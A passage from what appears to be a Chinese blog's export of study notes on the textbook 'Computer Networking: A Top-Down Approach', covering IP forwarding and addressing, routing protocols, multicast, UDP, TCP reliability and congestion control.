title="经互联网络交换"></a>经互联网络交换</h5><p>纵横式交换机，2N条总线组成网络，连接N各输入端口和N个输出端口<br>每条垂直的总线与每条水平的总线交叉，交叉点通过交换结构控制器开启闭合<br>某分组到达端口A，需要转发到Y，交换机控制器闭合总线A和Y的交叉点，A在其总线上发送分组，仅由Y接收；同时B也能发分组到X，因为没有公用总线。纵横式网络能并行转发多个分组</p><h3 id="四、网际协议（IP）：因特网中的转发和编址"><a href="#四、网际协议（IP）：因特网中的转发和编址" class="headerlink" title="四、网际协议（IP）：因特网中的转发和编址"></a>四、网际协议（IP）：因特网中的转发和编址</h3><h4 id="网络层三个组件"><a href="#网络层三个组件" class="headerlink" title="网络层三个组件"></a>网络层三个组件</h4><ol><li>IP协议</li><li>路由选择协议</li><li>控制报文协议（ICMP）：报告数据报中的差错、对某些网络层信息请求进行响应的设施<h4 id="IP数据报格式分析"><a href="#IP数据报格式分析" class="headerlink" title="IP数据报格式分析"></a>IP数据报格式分析</h4><img src="2.png" alt=""></li><li>版本号（IPv4、IPv6）：不同版本对数据报不同解释</li><li>首部长度：数据报可包含可变数量的选项。不过大部分没有，首部固定20字节</li><li>服务类型：区分不同类型的IP数据报</li><li>数据报长度：首部+数据的长度。该字段16bit，然而一般数据报很少超过1500字节<br>标识、标志、片偏移：IP分片相关。不过IPv6不允许在路由器上对分组分片</li><li>寿命TTL：确保数据报不会永远在网络中循环。每被一个路由器处理时，值-1。若值减到0，丢弃数据报</li><li>协议号：到达最终目的地才有用，指示了IP数据报的数据部分应该交给哪个运输层协议。如6交给TCP，如17交给UDP </li><li>协议号是将网络层与运输层绑定到一起的粘合剂；端口号是将运输层和应用层绑定的粘合剂</li><li>首部检验和：帮忙路由器检测收到IP数据报中首部的比特错误，有错一般丢弃</li><li>源和目的IP地址：源主机通过DNS查找目的地址</li><li>选项：IPv6已抛弃选项字段</li><li>数据（有效载荷）：包含运输层报文段（TCP或UDP），或ICMP报文段<br>一个IP数据报有长为20的首部，如果数据报承载一个TCP报文段，则每个无分片数据报承载总长40的首部（还有TCP的20）以及应用层报文</li></ol><h4 id="IP数据报分片"><a href="#IP数据报分片" class="headerlink" title="IP数据报分片"></a>IP数据报分片</h4><p>因为不是所有的链路层协议都能承载相同长度的网络层分组。比如以太网帧的MTU(Maximum Transmission)即最大传送单元(一个链路层帧能承载的最大数据量)为1500字节。链路层的MTU严格限制IP数据报的长度。因此要进行分片，将IP数据报中的数据分片成多个较小的IP数据报(fragment)再分别用链路层帧封装。</p><p>e.g. 一个4000字节的数据报(20字节IP首部加上3980字节IP有效载荷)到达一台路由器，且必须被转发到一条MTU为1500字节的链路上。问要分多少片？每片多少字节？<br>解答： 3980/1500 = 2.65 &lt; 3 则应该分为3片，数据字段分别长1480, 1480, 1020(3980-1480-1480)<br>注意！分片除了最后一片，所有数据字段长应该是8的倍数！偏移值应当被规定以8字节块为单位！</p><h4 id="分类的IP地址-—-最基本的编址方法"><a href="#分类的IP地址-—-最基本的编址方法" class="headerlink" title="分类的IP地址 — 最基本的编址方法"></a>分类的IP地址 — 最基本的编址方法</h4><p><img src="3.png" alt=""></p><h5 id="A类地址"><a href="#A类地址" class="headerlink" title="A类地址"></a>A类地址</h5><p>可指派的网络号是126(即$2^{7}-2)$$个.(减去全0和全1两种情况)。最大主机数 $2^{24}-2$个。(减去主机号全0和全1)</p><h5 id="B类地址"><a href="#B类地址" class="headerlink" title="B类地址"></a>B类地址</h5><p>可指派的网络号是16383(即$2^{14}-1)$$个.(没有主机号全0和全1的情况，但是128.0.0.0不指配，最小网络地址128.1.0.0)。最大主机数$2^{16}-2$个。(减去主机号全0和全1)</p><h5 id="C类地址"><a href="#C类地址" class="headerlink" title="C类地址"></a>C类地址</h5><p>可指派的网络号是16383(即$2^{21}-1)$$个.(没有主机号全0和全1的情况，但是192.0.0.0不指配,最小网络地址192.0.1.0)。最大主机数$2^{8}-2$个。(减去主机号全0和全1)</p><h5 id="D，E类专用了，一般很少见"><a href="#D，E类专用了，一般很少见" class="headerlink" title="D，E类专用了，一般很少见"></a>D，E类专用了，一般很少见</h5><p><img src="4.png" alt=""><br><img src="5.png" alt=""></p><h4 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h4><p>从网络的主机号借用若干位作为子网号。划分子网在内部，因此对外仍是一个网络！<br><img src="6.png" alt=""><br>子网掩码(network mask)<br><img src="7.png" alt=""><br>子网的网络地址 = 子网掩码 &amp; IP地址 (相与 and)<br>一张图足以概括。另外，若没有划分子网，也必须有子网掩码，使用默认子网掩码。<br><img src="8.png" alt=""></p><h3 id="五、路由选择算法"><a href="#五、路由选择算法" class="headerlink" title="五、路由选择算法"></a>五、路由选择算法</h3><h4 id="一种广义分类可将路由选择算法分为"><a href="#一种广义分类可将路由选择算法分为" class="headerlink" title="一种广义分类可将路由选择算法分为"></a>一种广义分类可将路由选择算法分为</h4><ol><li>全局式路由选择算法(global routing algorithm)：用完整的、全局性的网络制式计算出从源到目的地之间的最低费用路径。实践中，具有全局状态信息的算法常被称为链路状态(Link State, LS)算法。</li><li>分散式路由选择算法(decentralized routing algorithm)：以迭代、分布式的方式计算出最低费用路径。一个常用的算法为距离向量(Distance-Vector, DV)算法。<br>由于过于复杂，需要单独研究</li></ol><h3 id="六、自治系统内路由选择-–-内部网关协议"><a href="#六、自治系统内路由选择-–-内部网关协议" class="headerlink" title="六、自治系统内路由选择 – 内部网关协议"></a>六、自治系统内路由选择 – 内部网关协议</h3><h4 id="6-1、路由选择信息协议-Routing-Information-Protocol-RIP"><a href="#6-1、路由选择信息协议-Routing-Information-Protocol-RIP" class="headerlink" title="6.1、路由选择信息协议(Routing Information Protocol, RIP)"></a>6.1、路由选择信息协议(Routing Information Protocol, RIP)</h4><p>使用距离向量算法。</p><ol><li>仅和相邻路由器交换信息。</li><li>路由器交换的信息时当前本路由器知道的全部信息。</li><li>按固定的时间间隔交换路由信息。</li></ol><p>刚开始时，到直接相连的网络距离定义为1。每经过一个路由器，跳数加1，跳数为16相当于不可达。事实证明，RIP协议可以较快收敛。<br>缺点是当网络出现故障，要记过比较长的时间才能将信息传送到所有的路由器。</p><p>RIP协议使用运输层的用户数据报UDP进行传送。RIP1和RIP2的报文首部相同，路由部分有些不同。<br><img src="9.png" alt=""></p><h4 id="6-2、开放最短路径优先-Open-Shortest-Path-First-OSPF"><a href="#6-2、开放最短路径优先-Open-Shortest-Path-First-OSPF" class="headerlink" title="6.2、开放最短路径优先(Open Shortest Path First, OSPF)"></a>6.2、开放最短路径优先(Open Shortest Path First, OSPF)</h4><p>使用链路状态协议。</p><ol><li>向本自治系统中所有路由器发送信息。使洪泛法(flooding)。</li><li>发送的信息就是与本路由器相邻的所有路由器的链路状态。</li><li>只有当链路状态发生变化时，路由器才向所有路由器用洪泛法发送此消息。</li></ol><p>各个路由器频繁的交换链路状态信息，所有的路由器建立一个链路状态数据库，这实际上就是全网的拓扑图。OSPF的更新过程收敛得快。<br>OSPF直接用IP数据报传送。(注意RIP是用UDP的)<br><img src="10.png" alt=""></p><h4 id="6-3、外部网关协议BGP"><a href="#6-3、外部网关协议BGP" class="headerlink" title="6.3、外部网关协议BGP"></a>6.3、外部网关协议BGP</h4><p>BGP采用路径向量(path vector)路由选择协议。协议交换路由信息节点数量级是自治系统个数的数量级。刚开始运行时，BGP的邻站是交换整个的BGP路由表。但以后只需要在发生变化时更新有变化的部分。<br><img src="11.png" alt=""></p><h3 id="七、广播与多播路由选择"><a href="#七、广播与多播路由选择" class="headerlink" title="七、广播与多播路由选择"></a>七、广播与多播路由选择</h3><h4 id="7-1、-广播路由选择算法"><a href="#7-1、-广播路由选择算法" class="headerlink" title="7.1、 广播路由选择算法"></a>7.1、 广播路由选择算法</h4><h5 id="N次单播"><a href="#N次单播" class="headerlink" title="N次单播"></a>N次单播</h5><p>给定N个目的节点，源结点产生该分组的N份副本，对不同目的地每个副本编址，用单播路由选择传送<br>效率低，多份独立的副本会重复经过某段链路，让网络结点本身生成分组副本更有效</p><h5 id="无控制洪泛"><a href="#无控制洪泛" class="headerlink" title="无控制洪泛"></a>无控制洪泛</h5><p>源节点向所有邻居发送分组副本，结点复制该分组并向它邻居转发<br>图中有环，会无休止循环<br>当一个结点与两个以上结点连接时，它将生成并转发广播分组的多个副本，副本中的每个又产生多个副本，产生广播风暴，使网络变得毫无用处</p><h5 id="受控洪泛"><a href="#受控洪泛" class="headerlink" title="受控洪泛"></a>受控洪泛</h5><p>序号控制洪泛：源节点将其地址或其他唯一标识和广播序号放入广播分组，每个结点维护源地址和序号列表<br>反向路径转发RPF：仅当分组到达的链路正好位于它自己返回源的最短单薄路径上，才传输报文，否则丢弃</p><h5 id="生成树广播"><a href="#生成树广播" class="headerlink" title="生成树广播"></a>生成树广播</h5><p>构造最小生成树；结点只需知道哪些邻居在生成树中<br>分布式生成树算法<br>基于中心的方法：建立一棵生成树时，定义一个中心结点（汇合点、核），结点向中心结点单薄加入树的报文。加入树的报文使用单播路由选择朝着中心结点进发，直到它到达一个生成树中，经过的路径再嫁接到现有生成树中</p><h4 id="7-2、多播"><a href="#7-2、多播" class="headerlink" title="7.2、多播"></a>7.2、多播</h4><h5 id="一些新兴应用要求将分组从一个或多个发送方交付给一组接收方，比如各种直播、游戏"><a href="#一些新兴应用要求将分组从一个或多个发送方交付给一组接收方，比如各种直播、游戏" class="headerlink" title="一些新兴应用要求将分组从一个或多个发送方交付给一组接收方，比如各种直播、游戏"></a>一些新兴应用要求将分组从一个或多个发送方交付给一组接收方，比如各种直播、游戏</h5><h5 id="多播数据报使用间接地址来编址。每个分组难道携带所有接收方IP地址？这不科学"><a href="#多播数据报使用间接地址来编址。每个分组难道携带所有接收方IP地址？这不科学" class="headerlink" title="多播数据报使用间接地址来编址。每个分组难道携带所有接收方IP地址？这不科学"></a>多播数据报使用间接地址来编址。每个分组难道携带所有接收方IP地址？这不科学</h5><p>用一个标识表示一组接收方（D类多播地址），接收方小组称为多播组</p><h5 id="因特网组管理协议IGMP"><a href="#因特网组管理协议IGMP" class="headerlink" title="因特网组管理协议IGMP"></a>因特网组管理协议IGMP</h5><p>IGMP + 多播路由选择协议 组成网络层多播</p><ol><li>第一阶段：当某个主机加入新的多播组时，该主机应向多播组的多播地址发送IGMP 报文，声明自己要成为该组的成员。本地的多播路由器收到 IGMP 报文后，将组成员关系转发给因特网上的其他多播路由器。</li><li>第二阶段：因为组成员关系是动态的，因此本地多播路由器要周期性地探询本地局域网上的主机，以便知道这些主机是否还继续是组的成员。只要对某个组有一个主机响应，那么多播路由器就认为这个组是活跃的。但一个组在经过几次的探询后仍然没有一个主机响应，则不再将该组的成员关系转发给其他的多播路由器。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-运输层</title>
      <link href="/2019/03/13/ji-suan-ji-wang-luo-zi-ding-xiang-xia-yun-shu-ceng/"/>
      <url>/2019/03/13/ji-suan-ji-wang-luo-zi-ding-xiang-xia-yun-shu-ceng/</url>
      
        <content type="html"><![CDATA[<h3 id="一、运输层提供的服务"><a href="#一、运输层提供的服务" class="headerlink" title="一、运输层提供的服务"></a>一、运输层提供的服务</h3><p>运输层为运行在不同主机上的应用<strong>进程</strong>之间提供逻辑通信功能。应用进程使用运输层提供的逻辑通信功能彼此发送报文，而无需考虑承载这些报文的物理基础。、<br><strong>运输层和网络层的关系</strong>：网络层提供了主机之间的逻辑通信，运输层为在不同主机上的进程之间提供了逻辑通信。运输层协议只在主机起作用，运输层能够提供的服务受制于网络层协议的服务模型。</p><h3 id="二、多路复用和多路分解"><a href="#二、多路复用和多路分解" class="headerlink" title="二、多路复用和多路分解"></a>二、多路复用和多路分解</h3><p>将运输层报文段中的数据交付到正确的套接字的工作成为多路分解。源主机从不同的套接字接收数据块，并为每个数据块封装上首部信息形成报文段，并将报文段传到网络的过程叫做多路复用。<br><img src="1.jpg" alt=""></p><a id="more"></a><p>多路复用要求：（1）套接字有唯一标识符（2）每个报文段有特殊字段来指示该报文段要交付到的套接字。特殊字段是指端口号。端口号是一个16比特数，0-1023为固定端口号，如HTTP（80端口）、FTP（21端口）。</p><h3 id="三、UDP协议（无连接运输）（8字节首部）"><a href="#三、UDP协议（无连接运输）（8字节首部）" class="headerlink" title="三、UDP协议（无连接运输）（8字节首部）"></a>三、UDP协议（无连接运输）（8字节首部）</h3><h4 id="3-1、UDP的优势：（1）实时性较强，TCP由于其拥塞控制实时性较弱（2）无需建立连接，没有建立连接的时延，因此DNS运行在UDP上，HTTP运行在TCP上（3）无连接状态，TCP需要在端系统中维护连接状态，包括接收和发送的缓存、拥塞控制参数以及序号与确认号的参数（4）分组首部开销小。"><a href="#3-1、UDP的优势：（1）实时性较强，TCP由于其拥塞控制实时性较弱（2）无需建立连接，没有建立连接的时延，因此DNS运行在UDP上，HTTP运行在TCP上（3）无连接状态，TCP需要在端系统中维护连接状态，包括接收和发送的缓存、拥塞控制参数以及序号与确认号的参数（4）分组首部开销小。" class="headerlink" title="3.1、UDP的优势：（1）实时性较强，TCP由于其拥塞控制实时性较弱（2）无需建立连接，没有建立连接的时延，因此DNS运行在UDP上，HTTP运行在TCP上（3）无连接状态，TCP需要在端系统中维护连接状态，包括接收和发送的缓存、拥塞控制参数以及序号与确认号的参数（4）分组首部开销小。"></a>3.1、UDP的优势：（1）实时性较强，TCP由于其拥塞控制实时性较弱（2）无需建立连接，没有建立连接的时延，因此DNS运行在UDP上，HTTP运行在TCP上（3）无连接状态，TCP需要在端系统中维护连接状态，包括接收和发送的缓存、拥塞控制参数以及序号与确认号的参数（4）分组首部开销小。</h4><p><img src="6.png" alt=""><br>常见应用及其运输协议：</p><table><thead><tr><th>应用</th><th align="center">应用层协议</th><th align="right">运输层协议</th></tr></thead><tbody><tr><td>电子邮件</td><td align="center">SMTP</td><td align="right">TCP</td></tr><tr><td>远程终端访问</td><td align="center">Telnet</td><td align="right">TCP</td></tr><tr><td>Web</td><td align="center">HTTP</td><td align="right">TCP</td></tr><tr><td>文件传输</td><td align="center">FTP</td><td align="right">TCP</td></tr><tr><td>远程文件服务器</td><td align="center">NFS</td><td align="right">UDP</td></tr><tr><td>流式多媒体</td><td align="center">通常专用</td><td align="right">UDP或TCP</td></tr><tr><td>因特网电话</td><td align="center">通常专用</td><td align="right">UDP或TCP</td></tr><tr><td>网络管理</td><td align="center">SNMP</td><td align="right">UDP</td></tr><tr><td>路由选择协议</td><td align="center">RIP</td><td align="right">UDP</td></tr><tr><td>名字转换</td><td align="center">DNS</td><td align="right">UDP</td></tr></tbody></table><h4 id="3-2、UDP检验和：差错检测功能"><a href="#3-2、UDP检验和：差错检测功能" class="headerlink" title="3.2、UDP检验和：差错检测功能"></a>3.2、UDP检验和：差错检测功能</h4><p>发送方的UDP对报文段中的所有16比特字的和进行反码运算，求和时遇到的任何溢出都被回卷（溢出后加到最后一位）。然后将该结果取反码作为检验和。在接收端，如果没有出错，所有数据和检验和相加的结果为1111111111111111。可以自己抓个包，自己静下来算一下，保证爽死你。</p><h3 id="四、可靠数据传输原理"><a href="#四、可靠数据传输原理" class="headerlink" title="四、可靠数据传输原理"></a>四、可靠数据传输原理</h3><p>可靠数据传输协议往往建立在不可靠IP网络层协议之上。</p><h4 id="4-1、构造可靠数据传输协议"><a href="#4-1、构造可靠数据传输协议" class="headerlink" title="4.1、构造可靠数据传输协议"></a>4.1、构造可靠数据传输协议</h4><h5 id="1、经完全可靠信道的可靠数据传输：rdt-1-0"><a href="#1、经完全可靠信道的可靠数据传输：rdt-1-0" class="headerlink" title="1、经完全可靠信道的可靠数据传输：rdt 1.0"></a>1、经完全可靠信道的可靠数据传输：rdt 1.0</h5><p>最简答的情况，底层信号完全可靠，然而这在实际中不能实现</p><h5 id="2、经具有比特差错信道的可靠数据传输：rdt-2-0"><a href="#2、经具有比特差错信道的可靠数据传输：rdt-2-0" class="headerlink" title="2、经具有比特差错信道的可靠数据传输：rdt 2.0"></a>2、经具有比特差错信道的可靠数据传输：rdt 2.0</h5><p>假设所有发送的分组都可以按其发送顺序被接收。基于重传机制的可靠数据传输协议称为自动重传请求协议（ARQ）。<br>ARQ协议中还需要另外三种协议功能来处理存在比特差错的情况：差错检测，接收方反馈，重传。<br>rdt2.0的发送端每发送一个分组需要等待接收端的确认信号，这种协议被称为停等协议。这种协议的一个关键问题是没有考虑确认信号受损的情况。解决这一问题的方法是在数据分组中添加一个新字段，让发送方对其数据分组编号，即序号的概念。此为rdt2.1。rdt2.2时在rdt2.1的基础上实现了一个没有否定确认的可靠传输协议。</p><h5 id="3、经具有比特差错的丢包信道的可靠数据传输：rdt3-0"><a href="#3、经具有比特差错的丢包信道的可靠数据传输：rdt3-0" class="headerlink" title="3、经具有比特差错的丢包信道的可靠数据传输：rdt3.0"></a>3、经具有比特差错的丢包信道的可靠数据传输：rdt3.0</h5><p>检测丢包的方法：倒计数定时器用于实现基于时间的重传机制。<br>总结可靠传输需要的技术：检验和、序号、定时器、肯定和否定确认分组。</p><h4 id="4-2、流水线可靠数据传输协议"><a href="#4-2、流水线可靠数据传输协议" class="headerlink" title="4.2、流水线可靠数据传输协议"></a>4.2、流水线可靠数据传输协议</h4><p>rdt3.0的最大缺陷在于它是一个停等协议。因此诞生流水线概念，发送端不需要等待确认信号就可以发送下一个分组。但会带来如下影响：必须增加序号范围；协议双方必须缓存多个分组；序号范围和缓存大小取决于数据传输协议如何处理丢失、损坏及延时过大的分组。有两种基本方法：回退N步和选择重传<br>（1）回退N步（GBN）：允许发送端发送多个分组，但在流水线中未被确认的分组数不能大于N，N被称为窗口长度，GBN协议也被称为滑动窗口协议。如果出现超时，发送方会重传所有已发送但未被确认的分组，即回退N步，从而保证接收端可以按序将数据交付给上层。<br>（2）选择重传（SR）：GBN中单个分组的错误会引起重传大量分组。选择重传协议通过让发送端仅重传那些它怀疑在接收方出错的分组。</p><p>SR中发送端和接收端的序列空间：<br><img src="1.png" alt=""><br>SR协议会产生接收方不能确定新到的分组是一个新的分组还是一次重传，因此要求窗口长度必须小于或等于序号空间大小的一半。</p><h5 id="PS：其实意思就是当我回复我收到了第五个包，根据前面的协议，我虽然说的是第五个，但是前4个包我都已经收到了，所以现在你就不必纠结于第四个包是不是丢了我收没收到，其实你可以放心直接去发第六个包，不知道合不合理，逃ε-ε-ε-┏-゜ロ゜-┛"><a href="#PS：其实意思就是当我回复我收到了第五个包，根据前面的协议，我虽然说的是第五个，但是前4个包我都已经收到了，所以现在你就不必纠结于第四个包是不是丢了我收没收到，其实你可以放心直接去发第六个包，不知道合不合理，逃ε-ε-ε-┏-゜ロ゜-┛" class="headerlink" title="(PS：其实意思就是当我回复我收到了第五个包，根据前面的协议，我虽然说的是第五个，但是前4个包我都已经收到了，所以现在你就不必纠结于第四个包是不是丢了我收没收到，其实你可以放心直接去发第六个包，不知道合不合理，逃ε=ε=ε=┏(゜ロ゜;)┛)"></a>(PS：其实意思就是当我回复我收到了第五个包，根据前面的协议，我虽然说的是第五个，但是前4个包我都已经收到了，所以现在你就不必纠结于第四个包是不是丢了我收没收到，其实你可以放心直接去发第六个包，不知道合不合理，逃ε=ε=ε=┏(゜ロ゜;)┛)</h5><h4 id="五、TCP协议（面向连接的运输）（20字节首部）"><a href="#五、TCP协议（面向连接的运输）（20字节首部）" class="headerlink" title="五、TCP协议（面向连接的运输）（20字节首部）"></a>五、TCP协议（面向连接的运输）（20字节首部）</h4><p>TCP之所谓是面向连接的，是因为两个进程间通信前要先相互握手，且TCP提供全双工服务。TCP连接的组成包括：客户端主机上的缓存、变量和套接字，服务端上的缓存、变量和套接字。</p><h5 id="5-1、TCP报文段结构"><a href="#5-1、TCP报文段结构" class="headerlink" title="5.1、TCP报文段结构"></a>5.1、TCP报文段结构</h5><p><img src="2.png" alt=""></p><ol><li>源端口和目的端口，各占两个字节；</li><li>序号seq，4个字节，TCP传送的字节流中每个字节都要编号；</li><li>确认号ack，4个字节，期望发送方下一个报文的第一个数据字节的序号；</li><li>2个字节的接收窗口字段，用于流量控制；</li><li>4比特的首部长度，通常为空；</li><li>可选与变长的选项字段，用于发送方和接收方协商最大报文段长度时，或在高速网络环境下用于窗口调节因子使用；</li><li>6比特的标志字段：紧急URG，表明此报文中有紧急数据，紧急数据的最后一个字节的指针由紧急指针指出；确认ACK，表明该报文段为已成功接收报文段的确认；PSH=1时，表明接收方应立即将数据报交给上层；复位RST，当RST=1时，表明TCP连接出现错误，必须释放连接；同步SYN，在建立连接时用来同步序号。当SYN=1，ACK=0时表明是连接请求报文；响应报文为SYN=1，ACK=1；终止FIN，用来释放连接；</li></ol><p><strong>序号和确认号</strong>：TCP把数据看做有序无结构的字节流，用序号对每个传输的字节进行编号。由于TCP是全双工服务，在主机A向主机B发送报文的同时A也会接收B发送的报文，确认号则是接收方希望发送方发送的下一字节的序号。例如A已收到B发送的序号为0-535的所有字节，则A会在发给B的报文段的确认号中填入536。如果A在收到536-899之前收到900-1000，则确认号仍为536，这叫TCP的累积确认。</p><h5 id="5-2、抓包分析"><a href="#5-2、抓包分析" class="headerlink" title="5.2、抓包分析"></a>5.2、抓包分析</h5><p><img src="7.png" alt=""></p><h5 id="5-3、可靠数据传输"><a href="#5-3、可靠数据传输" class="headerlink" title="5.3、可靠数据传输"></a>5.3、可靠数据传输</h5><p>TCP的定时器管理过程只使用单一的重传定时器。</p><p>首先给出TCP高度简化的描述：发送方只用超时来恢复报文段的丢失。发送方有3个与发送和重传有关的事件：（1）TCP从应用程序接收数据，并编号交给IP，若定时器未启动则启动定时器（2）超时，则重传超时的报文段，并重启定时器（3）收到确认，采用累积确认，，所以当前确认号之前的所有报文段都已被接收，若仍有未确认的报文段，重启定时器。累积确认详见书图3.36。</p><p>超时间隔加倍：TCP每次重传都会将下一次超时间隔设为当前值的两倍，而不是通过EstimatedRTT设置。这是一种简单的拥塞控制。</p><p>快速重传：超时间隔加倍会增加端到端时延。而由于接收端累积确认，在未收到期望序号报文段时会不断的发送相同的ACK确认号，此为冗余ACK。当接收端收到3个冗余ACK时，TCP就执行快速重传，在定时器过期前重传丢失的报文段。</p><h5 id="5-4-流量控制"><a href="#5-4-流量控制" class="headerlink" title="5.4 流量控制"></a>5.4 流量控制</h5><p>TCP为其应用程序提供流量控制服务以消除发送方使接收方缓存溢出的可能性。TCP的流量控制通过接收窗口来实现，用于给发送方表明接收方还有多少可用的缓存空间。接收窗口用rwnd表示，有一个情况：A向B通信，当B缓存满了的时候，他返回的报文段中rwnd=0，如果B的应用程序将缓存清空了，同时B没有数据要向A发送，则A不能知道B的缓存清空。TCP规定在rwnd=0时A继续发送一个字节数据的报文段。</p><h5 id="5-5、三次握手，四次挥手"><a href="#5-5、三次握手，四次挥手" class="headerlink" title="5.5、三次握手，四次挥手"></a>5.5、三次握手，四次挥手</h5><p>三次握手：<br><img src="3.png" alt=""><br>为什么是3次握手？</p><p>1、主要是为了防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误连接。2、改为两次握手可能产生死锁。假设A向B发送请求，B收到请求后发送确认信号。此时如果按照两次握手协议，连接已建立，B开始传输数据。然后如果B的确认信号A没有接受到，A将不能知道B的序列号，将无法接受B的数据。而B在发送数据超时后会重复发送数据，从而死锁。<br><img src="4.png" alt=""><br>为什么要客户端要等待2MSL（报文最大生存时间）？</p><p>1、保证客户端发送的最后一个ACK报文能够到达服务器。2、如果客户端直接进入closed状态，而服务端还有数据在网络中，当有一个新连接的端口和服务端端口一样时，那么客户端会认为这些数据是新连接的。</p><p>当主机接收到一个TCP报文段，其端口号或源IP地址与该主机上进行中的套接字都不匹配，此时主机会向源发送一个特殊的重置报文段，其RST标志位置1.</p><h5 id="六、拥塞控制"><a href="#六、拥塞控制" class="headerlink" title="六、拥塞控制"></a>六、拥塞控制</h5><p>拥塞控制的方法：（1）端到端拥塞控制，网络层并没有为运输层的拥塞控制提供支持，TCP运用的方式，只能推断是否发生拥塞。（2）网络辅助的拥塞控制，路由器可以向发送端反馈网络的拥塞情况，但还未被用于TCP中。</p><h4 id="6-1、-TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）"><a href="#6-1、-TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）" class="headerlink" title="6.1、 TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）"></a>6.1、 TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）</h4><p>TCP采用的方法是让每一个发送方根据所感知到的网络拥塞程度来限制其能向连接发送流量的速率。<br>如何调整发送方的发送速率：在发送方跟踪一个变量，即拥塞窗口（cwnd），其对一个TCP发送方能向网络中发送流量的速率进行了限制（发送方中未被确认的数据量不超过cwnd和rwnd的最小值）。<br>如何感知拥塞：通过出现超时或3次冗余ACK来确认是否发生拥塞。<br>TCP发送方能够以更高的速率发送而不会使网络拥塞，有三个原则：（1）一个丢失的报文段意味拥塞，此时应降低TCP发送方速率（减小cwnd的大小）。（2）一个确认报文段指示网络正在向接收方交付发送方的报文段，此时可以增加发送方的速率。（3）带宽探测</p><h4 id="6-2、TCP拥塞控制算法：慢启动，拥塞避免，快速恢复"><a href="#6-2、TCP拥塞控制算法：慢启动，拥塞避免，快速恢复" class="headerlink" title="6.2、TCP拥塞控制算法：慢启动，拥塞避免，快速恢复"></a>6.2、TCP拥塞控制算法：慢启动，拥塞避免，快速恢复</h4><p>（1）慢启动</p><p>当TCP连接开始时，cwnd的值置为1个MSS（最大报文段长度），每当传输的报文段首次被确认就增加1个MSS，因此cwnd以指数增长。</p><p>指数增长的结束方案：（1）如果出现超时的丢包事件，将慢启动阈值ssthresh置为cwnd/2，并将cwnd重新置为1并重新开始慢启动。（2）当新的cwnd增长到超过ssthresh时，结束慢启动进入拥塞避免模式。（3）如果检测到3个冗余ACK则进入快速恢复状态。</p><p>（2）拥塞避免</p><p>每个RTT（往返时间）只增加一个MSS。假设当前MSS为1460字节而cwnd为14600字节，则一个RTT发送10个报文段，每到达一个ACK增加MSS/10的拥塞窗口长度，当收到10个报文段的所有ACK时增则会增加1个MSS。</p><p>当出现超时时，将ssthresh置为cwnd/2，同时将cwnd置为1，开始慢启动。当出现3次冗余ACK时，表示当前网络仍可以交付，TCP将ssthresh置为cwnd/2，同时cwnd=cwnd/2+3MSS，并进入快速恢复。</p><p>（3）快速恢复</p><p>在快速恢复中，对于引起TCP进入快速恢复状态的缺失报文段，每收到一个它的冗余ACK就将cwnd增加一个MSS。当收到丢失报文段的ACK时，cwnd=ssthresh，并进入拥塞避免。如果在这个阶段超时，同样进入慢启动。<br><img src="5.png" alt=""><br>公平性：在K条TCP连接经过传输速率为R的链路时，如果每条连接的平均传输速率接近R/K，则认为该拥塞控制是公平的。在每条TCP连接的RTT相等的情况下，上述TCP拥塞控制是公平的（详见图3.56），但实际中RTT小的连接会有更高的吞吐量。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-应用层及书后套接字编程练习参考</title>
      <link href="/2019/03/10/ji-suan-ji-wang-luo-zi-ding-xiang-xia-ying-yong-ceng-ji-shu-hou-tao-jie-zi-bian-cheng-lian-xi-can-kao/"/>
      <url>/2019/03/10/ji-suan-ji-wang-luo-zi-ding-xiang-xia-ying-yong-ceng-ji-shu-hou-tao-jie-zi-bian-cheng-lian-xi-can-kao/</url>
      
        <content type="html"><![CDATA[<h4 id="虽然说数字阅读填充碎片化时间，但是确实阅读纸质书更容易安静下来，之前看电子档的这本书只是囫囵吞枣，打算再看一次纸质书顺便把书后编程题做完去，否则只知道理论则百无一用是”书生”"><a href="#虽然说数字阅读填充碎片化时间，但是确实阅读纸质书更容易安静下来，之前看电子档的这本书只是囫囵吞枣，打算再看一次纸质书顺便把书后编程题做完去，否则只知道理论则百无一用是”书生”" class="headerlink" title="虽然说数字阅读填充碎片化时间，但是确实阅读纸质书更容易安静下来，之前看电子档的这本书只是囫囵吞枣，打算再看一次纸质书顺便把书后编程题做完去，否则只知道理论则百无一用是”书生”"></a>虽然说数字阅读填充碎片化时间，但是确实阅读纸质书更容易安静下来，之前看电子档的这本书只是囫囵吞枣，打算再看一次纸质书顺便把书后编程题做完去，否则只知道理论则百无一用是”书生”</h4><h3 id="一、进程通信"><a href="#一、进程通信" class="headerlink" title="一、进程通信"></a>一、进程通信</h3><p>在操作系统的术语中，进行通信额实际上是<strong>进程</strong>(process)而不是程序。<br>一个进程可以被认为是运行在端系统中的一个程序。<br>当进程运行在相同的端系统时，他们使用进程间相互通信机制相互通信，该机制由端系统上的操作系统确定。<br>在两个不同端系统上的进程，通过跨越计算机网络交换<strong>报文</strong>(message)而相互通信。</p><a id="more"></a><h4 id="1-1、客户和服务器进程"><a href="#1-1、客户和服务器进程" class="headerlink" title="1.1、客户和服务器进程"></a>1.1、客户和服务器进程</h4><p>在给定的一对进程的通信会话场景中，发起通信（即在该会话开始时发起与其他进程的联系）的进程被标识为客户，在会话开始时等待联系的进程是服务器。</p><h4 id="1-2、进程与计算机网络之间的接口"><a href="#1-2、进程与计算机网络之间的接口" class="headerlink" title="1.2、进程与计算机网络之间的接口"></a>1.2、进程与计算机网络之间的接口</h4><p>进程通过一个称为“套接字（socket）”的软件接口向网络发送报文和从网络接收报文。<br>套接字也被称为应用程序和网络之间的应用程序编程接口（Application programing interface，API）。</p><h4 id="1-3、运输层可以提供的四大方面服务"><a href="#1-3、运输层可以提供的四大方面服务" class="headerlink" 